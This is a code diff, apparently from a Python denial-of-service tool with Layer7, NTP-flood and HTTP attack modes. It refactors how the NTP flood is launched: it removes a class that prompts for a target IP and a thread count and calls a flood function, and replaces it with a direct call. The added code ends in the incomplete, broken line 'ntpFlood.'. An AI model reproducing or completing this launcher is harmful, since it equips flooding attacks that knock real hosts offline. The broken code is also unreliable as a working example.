@@ -356,34 +356,6 @@ class Layer7Attack:
                 play2 = False
 
 
-class NtpFloodAttack:
-    conf = dict()
-    def __init__(self):
-        questions = [
-            {
-                'type': 'input',
-                'name': 'target',
-                'message': 'IP of the Target :',
-                'validate': IpValidator
-            },
-            {
-                'type': 'input',
-                'name': 'thrdz',
-                'message': 'number Of threads',
-                'validate': IntValidator
-            }
-        ]
-        answers = prompt(questions, style=style)
-        self.target = answers.get("target")
-        self.threads = answers.get("thrdz")
-        NtpFloodAttack.conf = answers
-    @classmethod
-    def run(cls):
-        try:
-            ntpL4.floodNTP(int(cls.conf.get("thrdz")) ,cls.conf.get("target"))
-        except KeyboardInterrupt:
-            log("Stopping ...", color="red")
-
 
 class HttpGoFood:
     """
@@ -494,8 +466,9 @@ def main():
 
         if attack.get("mode") == "NTP packets Flood":
             try:
-                ntpFlood = NtpFloodAttack()
-                ntpFlood.run()
+                log("Starting NTP Flood Proccess ! Here we go  !!! ") 
+                ntpFlood =  ntpL4.NtpFlood()
+                ntpFlood.
             except KeyboardInterrupt :
                 log("Okay !! i'm stopping")
 
